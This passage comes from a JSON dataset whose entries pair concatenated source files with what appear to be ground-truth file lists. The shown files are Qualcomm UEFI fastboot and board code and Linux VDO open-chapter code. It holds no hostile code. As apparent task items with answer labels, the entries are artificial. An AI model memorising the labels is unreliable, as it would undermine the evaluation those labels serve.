        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFISoftSkuInfo.h'\n:\n#ifndef __EFISOFTSKU_H__\n#define __EFISOFTSKU_H__\n\n\n\n\n\n\n#define SOFT_SKU_REVISION 0x0000000000010001\n\n\n#define SOFT_SKU_MODULE_MAX_NUM        16\n\n\n\n#define SOFT_SKU_DEPENDENCY_MAX_NUM    16\n\n\n#define SOFT_SKU_DEPENDENCY_NAME_MAX_LEN    32\n\n\n\n\n\n\n#define EFI_SOFT_SKU_PROTOCOL_GUID                            \\\n    {                                                         \\\n      0xf917a796, 0x871b, 0x4595,                             \\\n      {                                                       \\\n        0x85, 0x5c, 0x95, 0x38, 0x87, 0x75, 0x2e, 0xa3        \\\n      }                                                       \\\n    }\n\n\n\n\n\n\ntypedef struct _EFI_QTI_SOFT_SKU_PROTOCOL  EFI_QTI_SOFT_SKU_PROTOCOL;\n\n\n\n\n\ntypedef enum\n{\n  SOFT_SKU_STATUS_UNINITIALIZED  = 0x0,\n  SOFT_SKU_STATUS_SUCCESS,\n  SOFT_SKU_STATUS_FAIL\n} EFI_SOFT_SKU_STATUS_TYPE;\n\n\ntypedef enum\n{\n  SOFT_SKU_ID_FP1 = 0x1,\n  SOFT_SKU_ID_FP2,\n  SOFT_SKU_ID_FP3,\n  SOFT_SKU_ID_FP_B3 = 0x7\n} EFI_SOFT_SKU_ID_TYPE;\n\n\ntypedef struct\n{\n  EFI_SOFT_SKU_STATUS_TYPE  eStatus;\n} EFI_SOFT_SKU_MODULE_INFO;\n\n\ntypedef struct\n{\n  UINT32                    uNumModules;\n  EFI_SOFT_SKU_MODULE_INFO  sInfo[SOFT_SKU_MODULE_MAX_NUM];\n} EFI_SOFT_SKU_STATUS_INFO;\n\n\n\ntypedef struct\n{\n  EFI_SOFT_SKU_STATUS_TYPE  eTALoadStatus;\n  EFI_SOFT_SKU_STATUS_INFO  sTAExeStatus;\n  EFI_SOFT_SKU_STATUS_TYPE  eTAUnloadStatus;\n} EFI_SOFT_SKU_STATUS;\n\n\ntypedef struct\n{\n  EFI_SOFT_SKU_ID_TYPE  eSoftSKUId;\n} EFI_SOFT_SKU_ID;\n\n\n\n\n\n\n\ntypedef\nEFI_STATUS (EFIAPI *EFI_SOFT_SKU_QUERY_STATUS)(\n  EFI_SOFT_SKU_STATUS *pStatus\n);\n\n\n\ntypedef\nEFI_STATUS (EFIAPI *EFI_SOFT_SKU_QUERY_SKU_ID)(\n  EFI_SOFT_SKU_ID *pSKUId\n);\n\n\n\n\nstruct _EFI_QTI_SOFT_SKU_PROTOCOL\n{\n  EFI_SOFT_SKU_QUERY_STATUS  SoftSKUQueryStatus;\n  EFI_SOFT_SKU_QUERY_SKU_ID  SoftSKUQuerySKUId;\n};\n\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/FastbootLib/UsbDescriptors.c'\n:\n#include \"UsbDescriptors.h\"\n#include \"FastbootCmds.h\"\n#include <Library/Board.h>\n\n#define FAST_BOOT_VENDOR 0x045E\n#define FAST_BOOT_IDPRODUCT 0x0C2F\n#define MAX_DESC_LEN 62\n#define UUID_STR_LEN 36\n\nSTATIC\nEFI_USB_DEVICE_DESCRIPTOR\nDeviceDescriptor = {\n    sizeof (EFI_USB_DEVICE_DESCRIPTOR),\n    USB_DESC_TYPE_DEVICE,\n    0x0210,\n    0x00,\n    0x00,\n    0x00,\n    64,\n    FAST_BOOT_VENDOR,\n    FAST_BOOT_IDPRODUCT,\n    0x100,\n    1,\n    2,\n    3,\n    1\n};\n\nSTATIC\nEFI_USB_DEVICE_DESCRIPTOR\nSSDeviceDescriptor = {\n    sizeof (EFI_USB_DEVICE_DESCRIPTOR),\n    USB_DESC_TYPE_DEVICE,\n    0x0300,\n    0x00,\n    0x00,\n    0x00,\n    9,\n    FAST_BOOT_VENDOR,\n    FAST_BOOT_IDPRODUCT,\n    0x100,\n    1,\n    2,\n    3,\n    1\n};\n\nEFI_USB_DEVICE_QUALIFIER_DESCRIPTOR\nDeviceQualifier = {\n    sizeof (EFI_USB_DEVICE_QUALIFIER_DESCRIPTOR),\n    USB_DESC_TYPE_DEVICE_QUALIFIER,\n    0x0200,\n    0xff,\n    0xff,\n    0xff,\n    64,\n    1,\n    0\n};\n\nSTATIC\nstruct _SSCfgDescTree {\n  EFI_USB_CONFIG_DESCRIPTOR ConfigDescriptor;\n  EFI_USB_INTERFACE_DESCRIPTOR InterfaceDescriptor;\n  EFI_USB_ENDPOINT_DESCRIPTOR EndpointDescriptor0;\n  EFI_USB_SS_ENDPOINT_COMPANION_DESCRIPTOR EndpointCompanionDescriptor0;\n  EFI_USB_ENDPOINT_DESCRIPTOR EndpointDescriptor1;\n  EFI_USB_SS_ENDPOINT_COMPANION_DESCRIPTOR EndpointCompanionDescriptor1;\n} TotalSSConfigDescriptor = {\n    {\n        sizeof (EFI_USB_CONFIG_DESCRIPTOR),\n        USB_DESC_TYPE_CONFIG,\n        sizeof (TotalSSConfigDescriptor),\n        1,\n        1,\n        0,\n        0x80,\n        0x10\n    },\n    {sizeof (EFI_USB_INTERFACE_DESCRIPTOR),\n     USB_DESC_TYPE_INTERFACE,\n     0,\n     0,\n     2,\n     0xff,\n     0x42,\n     0x03,\n     4},\n    {\n        sizeof (EFI_USB_ENDPOINT_DESCRIPTOR),\n        USB_DESC_TYPE_ENDPOINT,\n        ENDPOINT_ADDR (USBLB_BULK_EP, TRUE),\n        USB_ENDPOINT_BULK,\n        1024,\n        0\n    },\n    {\n        sizeof (EFI_USB_SS_ENDPOINT_COMPANION_DESCRIPTOR),\n        USB_DESC_TYPE_SS_ENDPOINT_COMPANION,\n        4,\n        0,\n        0,\n    },\n    {\n        sizeof (EFI_USB_ENDPOINT_DESCRIPTOR),\n        USB_DESC_TYPE_ENDPOINT,\n        ENDPOINT_ADDR (USBLB_BULK_EP, FALSE),\n        USB_ENDPOINT_BULK,\n        1024,\n        0\n    },\n    {\n        sizeof (EFI_USB_SS_ENDPOINT_COMPANION_DESCRIPTOR),\n        USB_DESC_TYPE_SS_ENDPOINT_COMPANION,\n        4,\n        0,\n        0,\n    }};\n\n#pragma pack(1)\ntypedef struct _CfgDescTree {\n  EFI_USB_CONFIG_DESCRIPTOR ConfigDescriptor;\n  EFI_USB_INTERFACE_DESCRIPTOR InterfaceDescriptor;\n  EFI_USB_ENDPOINT_DESCRIPTOR EndpointDescriptor0;\n  EFI_USB_ENDPOINT_DESCRIPTOR EndpointDescriptor1;\n} CONFIG_DESCRITPROS;\n#pragma pack()\n\nSTATIC CONFIG_DESCRITPROS TotalConfigDescriptor = {\n    {\n        sizeof (EFI_USB_CONFIG_DESCRIPTOR),\n        USB_DESC_TYPE_CONFIG,\n        sizeof (EFI_USB_CONFIG_DESCRIPTOR) +\n            sizeof (EFI_USB_INTERFACE_DESCRIPTOR) +\n            sizeof (EFI_USB_ENDPOINT_DESCRIPTOR) +\n            sizeof (EFI_USB_ENDPOINT_DESCRIPTOR),\n        1,\n        1,\n        0,\n        0x80,\n        0x50\n    },\n    {sizeof (EFI_USB_INTERFACE_DESCRIPTOR),\n     USB_DESC_TYPE_INTERFACE,\n     0,\n     0,\n     2,\n     0xff,\n     0x42,\n     0x03,\n     4},\n    {\n        sizeof (EFI_USB_ENDPOINT_DESCRIPTOR),\n        USB_DESC_TYPE_ENDPOINT,\n        ENDPOINT_ADDR (USBLB_BULK_EP, TRUE),\n        USB_ENDPOINT_BULK,\n        512,\n        0\n    },\n    {\n        sizeof (EFI_USB_ENDPOINT_DESCRIPTOR),\n        USB_DESC_TYPE_ENDPOINT,\n        ENDPOINT_ADDR (USBLB_BULK_EP, FALSE),\n        USB_ENDPOINT_BULK,\n        512,\n        1\n    },\n};\n\nSTATIC\nCONST\nUINT8\nStr0Descriptor[4] = {\n    sizeof (Str0Descriptor), USB_DESC_TYPE_STRING, 0x09, 0x04\n};\n\nSTATIC\nCONST\nUINT8\nStrManufacturerDescriptor[14] = {\n    sizeof (StrManufacturerDescriptor),\n    USB_DESC_TYPE_STRING,\n    'G',\n    0,\n    'o',\n    0,\n    'o',\n    0,\n    'g',\n    0,\n    'l',\n    0,\n    'e',\n    0,\n};\n\nSTATIC\nUINT8\nStrSerialDescriptor[MAX_DESC_LEN];\n\nSTATIC\nCONST\nUINT8\nStrInterfaceDescriptor[18] = {\n    sizeof (StrInterfaceDescriptor),\n    USB_DESC_TYPE_STRING,\n    'f',\n    0,\n    'a',\n    0,\n    's',\n    0,\n    't',\n    0,\n    'b',\n    0,\n    'o',\n    0,\n    'o',\n    0,\n    't',\n    0,\n};\n\nSTATIC\nCONST\nUINT8\nStrProductDescriptor[16] = {\n    sizeof (StrProductDescriptor),\n    USB_DESC_TYPE_STRING,\n    'A',\n    0,\n    'n',\n    0,\n    'd',\n    0,\n    'r',\n    0,\n    'o',\n    0,\n    'i',\n    0,\n    'd',\n    0,\n};\n\nEFI_USB_STRING_DESCRIPTOR *StrDescriptors[5] = {\n    (EFI_USB_STRING_DESCRIPTOR *)Str0Descriptor,\n    (EFI_USB_STRING_DESCRIPTOR *)StrManufacturerDescriptor,\n    (EFI_USB_STRING_DESCRIPTOR *)StrProductDescriptor,\n    (EFI_USB_STRING_DESCRIPTOR *)StrSerialDescriptor,\n    (EFI_USB_STRING_DESCRIPTOR *)StrInterfaceDescriptor};\n\nVOID\nBuildDefaultDescriptors (OUT USB_DEVICE_DESCRIPTOR **DevDesc,\n                         OUT VOID **Descriptors,\n                         OUT USB_DEVICE_DESCRIPTOR **SSDevDesc,\n                         OUT VOID **SSDescriptors)\n{\n  UINT8 Index = 0;\n  UINT8 NumCfg = 0;\n  CHAR8 Str_UUID[UUID_STR_LEN];\n  UINT32 i;\n  EFI_STATUS Status;\n\n  Status = BoardSerialNum (Str_UUID, sizeof (Str_UUID));\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Error Finding board serial num: %x\\n\", Status));\n    return;\n  }\n\n\n  if (((AsciiStrLen (Str_UUID) - 1) * 2 + 3) > (MAX_DESC_LEN - 1)) {\n    DEBUG ((EFI_D_ERROR, \"Error the array index out of bounds\\n\"));\n    return;\n  }\n\n  StrSerialDescriptor[0] = AsciiStrLen (Str_UUID) * 2 + 2;\n  StrSerialDescriptor[1] = USB_DESC_TYPE_STRING;\n  for (i = 0; i < AsciiStrLen (Str_UUID); i++) {\n    StrSerialDescriptor[i * 2 + 2] = Str_UUID[i];\n    StrSerialDescriptor[i * 2 + 3] = 0;\n  }\n\n  *DevDesc = &DeviceDescriptor;\n  *SSDevDesc = &SSDeviceDescriptor;\n  NumCfg = DeviceDescriptor.NumConfigurations;\n\n  *Descriptors = AllocateZeroPool (NumCfg * sizeof (struct _CfgDescTree *));\n  if (*Descriptors == NULL) {\n    DEBUG (\n        (EFI_D_ERROR, \"Error Allocating memory for HS config descriptors\\n\"));\n    return;\n  }\n\n  *SSDescriptors = AllocateZeroPool (NumCfg * sizeof (struct _SSCfgDescTree *));\n  if (*SSDescriptors == NULL) {\n    DEBUG (\n        (EFI_D_ERROR, \"Error Allocating memory for SS config descriptors\\n\"));\n    FreePool (*Descriptors);\n    *Descriptors = NULL;\n    return;\n  }\n  for (Index = 0; Index < NumCfg; Index++) {\n    Descriptors[Index] = &TotalConfigDescriptor;\n  }\n  for (Index = 0; Index < NumCfg; Index++) {\n    SSDescriptors[Index] = &TotalSSConfigDescriptor;\n  }\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/Board.h'\n:\n\n\n#ifndef __BOARD_H__\n#define __BOARD_H__\n\n#include <Uefi.h>\n#include <Library/DebugLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Protocol/EFIChipInfo.h>\n#include <Protocol/EFIPlatformInfo.h>\n#include <Protocol/EFIPmicVersion.h>\n#include <Protocol/EFIRamPartition.h>\n#include <Protocol/EFISoftSkuInfo.h>\n\n#define HANDLE_MAX_INFO_LIST 128\n#define CHIP_BASE_BAND_LEN 4\n#define CHIP_BASE_BAND_MSM \"msm\"\n#define CHIP_BASE_BAND_APQ \"apq\"\n#define CHIP_BASE_BAND_MDM \"mdm\"\n\n#define BIT(x) (1ULL << x)\n\nextern RamPartitionEntry *RamPartitionEntries;\n\ntypedef enum {\n  EMMC = 0,\n  UFS = 1,\n  NAND = 2,\n  UNKNOWN,\n} MemCardType;\n\n#define DDR_SHIFT      8\n\n#define MB             (1024 * 1024UL)\n#define DDR_256MB      (256 * MB)\n#define DDR_512MB      (512 * MB)\n#define DDR_1024MB     (1024 * MB)\n#define DDR_2048MB     (2048 * MB)\n\ntypedef enum {\n  DDRTYPE_256MB = 1,\n  DDRTYPE_512MB,\n  DDRTYPE_1024MB,\n  DDRTYPE_2048MB,\n} DdrType;\n\nstruct BoardInfo {\n  EFI_PLATFORMINFO_PLATFORM_INFO_TYPE PlatformInfo;\n  UINT32 RawChipId;\n  CHAR8 ChipBaseBand[EFICHIPINFO_MAX_ID_LENGTH];\n  EFIChipInfoVersionType ChipVersion;\n  EFIChipInfoFoundryIdType FoundryId;\n  UINT32 HlosSubType;\n  UINT32 SoftSkuId;\n};\n\nEFI_STATUS\nBaseMem (UINT64 *BaseMemory);\n\nUINT32\nBoardPmicModel (UINT32 PmicDeviceIndex);\n\nUINT32\nBoardPmicTarget (UINT32 PmicDeviceIndex);\n\nEFI_STATUS BoardInit (VOID);\n\nEFI_STATUS\nBoardSerialNum (CHAR8 *StrSerialNum, UINT32 Len);\nUINT32 BoardPlatformRawChipId (VOID);\nCHAR8 *BoardPlatformChipBaseBand (VOID);\nEFIChipInfoVersionType BoardPlatformChipVersion (VOID);\nEFIChipInfoFoundryIdType BoardPlatformFoundryId (VOID);\nEFI_PLATFORMINFO_PLATFORM_TYPE BoardPlatformType (VOID);\nUINT32 BoardPlatformVersion (VOID);\nUINT32 BoardPlatformSubType (VOID);\nUINT32 BoardTargetId (VOID);\nVOID\nGetRootDeviceType (CHAR8 *StrDeviceType, UINT32 Len);\nMemCardType\nCheckRootDeviceType (VOID);\nVOID\nBoardHwPlatformName (CHAR8 *StrHwPlatform, UINT32 Len);\nEFI_STATUS\nUfsGetSetBootLun (UINT32 *UfsBootlun, BOOLEAN IsGet);\nBOOLEAN BoardPlatformFusion (VOID);\nUINT32 BoardPlatformRawChipId (VOID);\nEFI_STATUS ReadRamPartitions (RamPartitionEntry **RamPartitions,\n                  UINT32 *NumPartitions);\nEFI_STATUS GetGranuleSize (UINT32 *MinPasrGranuleSize);\nVOID GetPageSize (UINT32 *PageSize);\nEFI_STATUS BoardDdrType (UINT32 *Type);\nUINT32 BoardPlatformHlosSubType (VOID);\nVOID BoardSoftSku (EFI_SOFT_SKU_ID *SkuId);\nUINT32 BoardSoftSkuId (VOID);\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFISoftSkuInfo.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/Board.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/FastbootLib/UsbDescriptors.c'"
        ]
    },
    {
        "files": [
            "'vdo/utils/uds/open-chapter.h'",
            "'vdo/utils/uds/volume.h'",
            "'vdo/utils/uds/linux/limits.h'",
            "'vdo/utils/uds/open-chapter.c'"
        ],
        "content": "'vdo/utils/uds/open-chapter.h'\n:\n\n\n#ifndef UDS_OPEN_CHAPTER_H\n#define UDS_OPEN_CHAPTER_H\n\n#include \"chapter-index.h\"\n#include \"geometry.h\"\n#include \"index.h\"\n#include \"volume.h\"\n\n\n\nenum {\n\tOPEN_CHAPTER_RECORD_NUMBER_BITS = 23,\n};\n\nstruct open_chapter_zone_slot {\n\n\tunsigned int record_number : OPEN_CHAPTER_RECORD_NUMBER_BITS;\n\n\tbool deleted : 1;\n} __packed;\n\nstruct open_chapter_zone {\n\n\tunsigned int capacity;\n\n\tunsigned int size;\n\n\tunsigned int deletions;\n\n\tstruct uds_volume_record *records;\n\n\tunsigned int slot_count;\n\n\tstruct open_chapter_zone_slot slots[];\n};\n\nint __must_check uds_make_open_chapter(const struct index_geometry *geometry,\n\t\t\t\t       unsigned int zone_count,\n\t\t\t\t       struct open_chapter_zone **open_chapter_ptr);\n\nvoid uds_reset_open_chapter(struct open_chapter_zone *open_chapter);\n\nvoid uds_search_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t     const struct uds_record_name *name,\n\t\t\t     struct uds_record_data *metadata, bool *found);\n\nint __must_check uds_put_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t\t      const struct uds_record_name *name,\n\t\t\t\t      const struct uds_record_data *metadata);\n\nvoid uds_remove_from_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t\t  const struct uds_record_name *name);\n\nvoid uds_free_open_chapter(struct open_chapter_zone *open_chapter);\n\nint __must_check uds_close_open_chapter(struct open_chapter_zone **chapter_zones,\n\t\t\t\t\tunsigned int zone_count, struct volume *volume,\n\t\t\t\t\tstruct open_chapter_index *chapter_index,\n\t\t\t\t\tstruct uds_volume_record *collated_records,\n\t\t\t\t\tu64 virtual_chapter_number);\n\nint __must_check uds_save_open_chapter(struct uds_index *index,\n\t\t\t\t       struct buffered_writer *writer);\n\nint __must_check uds_load_open_chapter(struct uds_index *index,\n\t\t\t\t       struct buffered_reader *reader);\n\nu64 uds_compute_saved_open_chapter_size(struct index_geometry *geometry);\n\n#endif\n\n'vdo/utils/uds/volume.h'\n:\n\n\n#ifndef UDS_VOLUME_H\n#define UDS_VOLUME_H\n\n#include <linux/atomic.h>\n#include <linux/cache.h>\n#include <linux/dm-bufio.h>\n#include <linux/limits.h>\n\n#include \"permassert.h\"\n#include \"thread-utils.h\"\n\n#include \"chapter-index.h\"\n#include \"config.h\"\n#include \"geometry.h\"\n#include \"indexer.h\"\n#include \"index-layout.h\"\n#include \"index-page-map.h\"\n#include \"radix-sort.h\"\n#include \"sparse-cache.h\"\n\n\n\nenum index_lookup_mode {\n\n\tLOOKUP_NORMAL,\n\n\tLOOKUP_FOR_REBUILD,\n};\n\nstruct queued_read {\n\tbool invalid;\n\tbool reserved;\n\tu32 physical_page;\n\tstruct uds_request *first_request;\n\tstruct uds_request *last_request;\n};\n\nstruct __aligned(L1_CACHE_BYTES) search_pending_counter {\n\tu64 atomic_value;\n};\n\nstruct cached_page {\n\n\tbool read_pending;\n\n\tu32 physical_page;\n\n\ts64 last_used;\n\n\tstruct dm_buffer *buffer;\n\n\tstruct delta_index_page index_page;\n};\n\nstruct page_cache {\n\n\tunsigned int zone_count;\n\n\tu32 indexable_pages;\n\n\tu16 cache_slots;\n\n\tu16 *index;\n\n\tstruct cached_page *cache;\n\n\tstruct search_pending_counter *search_pending_counters;\n\n\tstruct queued_read *read_queue;\n\n\n\n\n\tu16 read_queue_first;\n\tu16 read_queue_next_read;\n\tu16 read_queue_last;\n\n\tatomic64_t clock;\n};\n\nstruct volume {\n\tstruct index_geometry *geometry;\n\tstruct dm_bufio_client *client;\n\tu64 nonce;\n\tsize_t cache_size;\n\n\n\tconst struct uds_volume_record **record_pointers;\n\n\tstruct radix_sorter *radix_sorter;\n\n\tstruct sparse_cache *sparse_cache;\n\tstruct page_cache page_cache;\n\tstruct index_page_map *index_page_map;\n\n\tstruct mutex read_threads_mutex;\n\tstruct cond_var read_threads_cond;\n\tstruct cond_var read_threads_read_done_cond;\n\tstruct thread **reader_threads;\n\tunsigned int read_thread_count;\n\tbool read_threads_exiting;\n\n\tenum index_lookup_mode lookup_mode;\n\tunsigned int reserved_buffers;\n};\n\nint __must_check uds_make_volume(const struct uds_configuration *config,\n\t\t\t\t struct index_layout *layout,\n\t\t\t\t struct volume **new_volume);\n\nvoid uds_free_volume(struct volume *volume);\n\nint __must_check uds_replace_volume_storage(struct volume *volume,\n\t\t\t\t\t    struct index_layout *layout,\n\t\t\t\t\t    struct block_device *bdev);\n\nint __must_check uds_find_volume_chapter_boundaries(struct volume *volume,\n\t\t\t\t\t\t    u64 *lowest_vcn, u64 *highest_vcn,\n\t\t\t\t\t\t    bool *is_empty);\n\nint __must_check uds_search_volume_page_cache(struct volume *volume,\n\t\t\t\t\t      struct uds_request *request,\n\t\t\t\t\t      bool *found);\n\nint __must_check uds_search_volume_page_cache_for_rebuild(struct volume *volume,\n\t\t\t\t\t\t\t  const struct uds_record_name *name,\n\t\t\t\t\t\t\t  u64 virtual_chapter,\n\t\t\t\t\t\t\t  bool *found);\n\nint __must_check uds_search_cached_record_page(struct volume *volume,\n\t\t\t\t\t       struct uds_request *request, u32 chapter,\n\t\t\t\t\t       u16 record_page_number, bool *found);\n\nvoid uds_forget_chapter(struct volume *volume, u64 chapter);\n\nint __must_check uds_write_chapter(struct volume *volume,\n\t\t\t\t   struct open_chapter_index *chapter_index,\n\t\t\t\t   const struct uds_volume_record records[]);\n\nvoid uds_prefetch_volume_chapter(const struct volume *volume, u32 chapter);\n\nint __must_check uds_read_chapter_index_from_volume(const struct volume *volume,\n\t\t\t\t\t\t    u64 virtual_chapter,\n\t\t\t\t\t\t    struct dm_buffer *volume_buffers[],\n\t\t\t\t\t\t    struct delta_index_page index_pages[]);\n\nint __must_check uds_get_volume_record_page(struct volume *volume, u32 chapter,\n\t\t\t\t\t    u32 page_number, u8 **data_ptr);\n\nint __must_check uds_get_volume_index_page(struct volume *volume, u32 chapter,\n\t\t\t\t\t   u32 page_number,\n\t\t\t\t\t   struct delta_index_page **page_ptr);\n\n#endif\n\n'vdo/utils/uds/linux/limits.h'\n:\n\n\n#ifndef UDS_LINUX_LIMITS_H\n#define UDS_LINUX_LIMITS_H\n\n#include <linux/types.h>\n#include <limits.h>\n\n#define U8_MAX  ((u8)~0ul)\n#define S8_MAX  ((s8)(U8_MAX >> 1))\n#define U16_MAX ((u16)~0ul)\n#define S16_MAX ((s16)(U16_MAX >> 1))\n#define U32_MAX ((u32)~0ul)\n#define S32_MAX ((s32)(U32_MAX >> 1))\n#define U64_MAX ((u64)~0ul)\n#define S64_MAX ((s64)(U64_MAX >> 1))\n\n\n#define NAME_MAX  255\n#define PATH_MAX  4096\n\n#endif\n\n'vdo/utils/uds/open-chapter.c'\n:\n\n\n#include \"open-chapter.h\"\n\n#include <linux/log2.h>\n\n#include \"logger.h\"\n#include \"memory-alloc.h\"\n#include \"numeric.h\"\n#include \"permassert.h\"\n\n#include \"config.h\"\n#include \"hash-utils.h\"\n\n\n\nstatic const u8 OPEN_CHAPTER_MAGIC[] = \"ALBOC\";\nstatic const u8 OPEN_CHAPTER_VERSION[] = \"02.00\";\n\n#define OPEN_CHAPTER_MAGIC_LENGTH (sizeof(OPEN_CHAPTER_MAGIC) - 1)\n#define OPEN_CHAPTER_VERSION_LENGTH (sizeof(OPEN_CHAPTER_VERSION) - 1)\n#define LOAD_RATIO 2\n\nstatic inline size_t records_size(const struct open_chapter_zone *open_chapter)\n{\n\treturn sizeof(struct uds_volume_record) * (1 + open_chapter->capacity);\n}\n\nstatic inline size_t slots_size(size_t slot_count)\n{\n\treturn sizeof(struct open_chapter_zone_slot) * slot_count;\n}\n\nint uds_make_open_chapter(const struct index_geometry *geometry, unsigned int zone_count,\n\t\t\t  struct open_chapter_zone **open_chapter_ptr)\n{\n\tint result;\n\tstruct open_chapter_zone *open_chapter;\n\tsize_t capacity = geometry->records_per_chapter / zone_count;\n\tsize_t slot_count = (1 << bits_per(capacity * LOAD_RATIO));\n\n\tresult = vdo_allocate_extended(struct open_chapter_zone, slot_count,\n\t\t\t\t       struct open_chapter_zone_slot, \"open chapter\",\n\t\t\t\t       &open_chapter);\n\tif (result != VDO_SUCCESS)\n\t\treturn result;\n\n\topen_chapter->slot_count = slot_count;\n\topen_chapter->capacity = capacity;\n\tresult = vdo_allocate_cache_aligned(records_size(open_chapter), \"record pages\",\n\t\t\t\t\t    &open_chapter->records);\n\tif (result != VDO_SUCCESS) {\n\t\tuds_free_open_chapter(open_chapter);\n\t\treturn result;\n\t}\n\n\t*open_chapter_ptr = open_chapter;\n\treturn UDS_SUCCESS;\n}\n\nvoid uds_reset_open_chapter(struct open_chapter_zone *open_chapter)\n{\n\topen_chapter->size = 0;\n\topen_chapter->deletions = 0;\n\n\tmemset(open_chapter->records, 0, records_size(open_chapter));\n\tmemset(open_chapter->slots, 0, slots_size(open_chapter->slot_count));\n}\n\nstatic unsigned int probe_chapter_slots(struct open_chapter_zone *open_chapter,\n\t\t\t\t\tconst struct uds_record_name *name)\n{\n\tstruct uds_volume_record *record;\n\tunsigned int slot_count = open_chapter->slot_count;\n\tunsigned int slot = uds_name_to_hash_slot(name, slot_count);\n\tunsigned int record_number;\n\tunsigned int attempts = 1;\n\n\twhile (true) {\n\t\trecord_number = open_chapter->slots[slot].record_number;\n\n\n\t\tif (record_number == 0)\n\t\t\treturn slot;\n\n\n\t\trecord = &open_chapter->records[record_number];\n\t\tif ((memcmp(&record->name, name, UDS_RECORD_NAME_SIZE) == 0) &&\n\t\t    !open_chapter->slots[record_number].deleted)\n\t\t\treturn slot;\n\n\n\t\tslot = (slot + attempts++) % slot_count;\n\t}\n}\n\nvoid uds_search_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t     const struct uds_record_name *name,\n\t\t\t     struct uds_record_data *metadata, bool *found)\n{\n\tunsigned int slot;\n\tunsigned int record_number;\n\n\tslot = probe_chapter_slots(open_chapter, name);\n\trecord_number = open_chapter->slots[slot].record_number;\n\tif (record_number == 0) {\n\t\t*found = false;\n\t} else {\n\t\t*found = true;\n\t\t*metadata = open_chapter->records[record_number].data;\n\t}\n}\n\n\nint uds_put_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t const struct uds_record_name *name,\n\t\t\t const struct uds_record_data *metadata)\n{\n\tunsigned int slot;\n\tunsigned int record_number;\n\tstruct uds_volume_record *record;\n\n\tif (open_chapter->size >= open_chapter->capacity)\n\t\treturn 0;\n\n\tslot = probe_chapter_slots(open_chapter, name);\n\trecord_number = open_chapter->slots[slot].record_number;\n\n\tif (record_number == 0) {\n\t\trecord_number = ++open_chapter->size;\n\t\topen_chapter->slots[slot].record_number = record_number;\n\t}\n\n\trecord = &open_chapter->records[record_number];\n\trecord->name = *name;\n\trecord->data = *metadata;\n\n\treturn open_chapter->capacity - open_chapter->size;\n}\n\nvoid uds_remove_from_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t\t  const struct uds_record_name *name)\n{\n\tunsigned int slot;\n\tunsigned int record_number;\n\n\tslot = probe_chapter_slots(open_chapter, name);\n\trecord_number = open_chapter->slots[slot].record_number;\n\n\tif (record_number > 0) {\n\t\topen_chapter->slots[record_number].deleted = true;\n\t\topen_chapter->deletions += 1;\n\t}\n}\n\nvoid uds_free_open_chapter(struct open_chapter_zone *open_chapter)\n{\n\tif (open_chapter != NULL) {\n\t\tvdo_free(open_chapter->records);\n\t\tvdo_free(open_chapter);\n\t}\n}\n\n\nstatic int fill_delta_chapter_index(struct open_chapter_zone **chapter_zones,\n\t\t\t\t    unsigned int zone_count,\n\t\t\t\t    struct open_chapter_index *index,\n\t\t\t\t    struct uds_volume_record *collated_records)\n{\n\tint result;\n\tunsigned int records_per_chapter;\n\tunsigned int records_per_page;\n\tunsigned int record_index;\n\tunsigned int records = 0;\n\tu32 page_number;\n\tunsigned int z;\n\tint overflow_count = 0;\n\tstruct uds_volume_record *fill_record = NULL;\n\n\n\tfor (z = 0; z < zone_count; z++) {\n\t\tstruct open_chapter_zone *zone = chapter_zones[z];\n\n\t\tif (zone->size == zone->capacity) {\n\t\t\tfill_record = &zone->records[zone->size];\n\t\t\tbreak;\n\t\t}\n\t}\n\n\trecords_per_chapter = index->geometry->records_per_chapter;\n\trecords_per_page = index->geometry->records_per_page;\n\n\tfor (records = 0; records < records_per_chapter; records++) {\n\t\tstruct uds_volume_record *record = &collated_records[records];\n\t\tstruct open_chapter_zone *open_chapter;\n\n\n\t\trecord_index = 1 + (records / zone_count);\n\t\tpage_number = records / records_per_page;\n\t\topen_chapter = chapter_zones[records % zone_count];\n\n\n\t\tif (record_index > open_chapter->size ||\n\t\t    open_chapter->slots[record_index].deleted) {\n\t\t\t*record = *fill_record;\n\t\t\tcontinue;\n\t\t}\n\n\t\t*record = open_chapter->records[record_index];\n\t\tresult = uds_put_open_chapter_index_record(index, &record->name,\n\t\t\t\t\t\t\t   page_number);\n\t\tswitch (result) {\n\t\tcase UDS_SUCCESS:\n\t\t\tbreak;\n\t\tcase UDS_OVERFLOW:\n\t\t\toverflow_count++;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tvdo_log_error_strerror(result,\n\t\t\t\t\t       \"failed to build open chapter index\");\n\t\t\treturn result;\n\t\t}\n\t}\n\n\tif (overflow_count > 0)\n\t\tvdo_log_warning(\"Failed to add %d entries to chapter index\",\n\t\t\t\toverflow_count);\n\n\treturn UDS_SUCCESS;\n}\n\nint uds_close_open_chapter(struct open_chapter_zone **chapter_zones,\n\t\t\t   unsigned int zone_count, struct volume *volume,\n\t\t\t   struct open_chapter_index *chapter_index,\n\t\t\t   struct uds_volume_record *collated_records,\n\t\t\t   u64 virtual_chapter_number)\n{\n\tint result;\n\n\tuds_empty_open_chapter_index(chapter_index, virtual_chapter_number);\n\tresult = fill_delta_chapter_index(chapter_zones, zone_count, chapter_index,\n\t\t\t\t\t  collated_records);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\treturn uds_write_chapter(volume, chapter_index, collated_records);\n}\n\nint uds_save_open_chapter(struct uds_index *index, struct buffered_writer *writer)\n{\n\tint result;\n\tstruct open_chapter_zone *open_chapter;\n\tstruct uds_volume_record *record;\n\tu8 